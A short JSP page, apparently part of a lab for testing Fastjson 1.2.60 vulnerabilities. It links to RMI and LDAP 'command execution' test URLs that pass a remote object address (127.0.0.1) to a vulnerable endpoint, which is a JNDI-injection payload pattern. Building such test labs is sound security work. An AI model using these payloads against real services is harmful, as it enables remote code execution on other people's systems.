<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>Fastjson 1.2.60 漏洞测试</title>
  </head>
  <body>
    <p>RMI 命令执行 <a target="_blank" href="/fastjson/fastjson?url=rmi://127.0.0.1:1099/ExportObject">/fastjson/fastjson?url=rmi://127.0.0.1:1099/ExportObject</a> </p>
    <p>LDAP 命令执行 <a target="_blank" href="/fastjson/fastjson?url=ldap://127.0.0.1:1399/ExportObject">/fastjson/fastjson?url=ldap://127.0.0.1:1399/ExportObject</a> </p>
  </body>
</html>
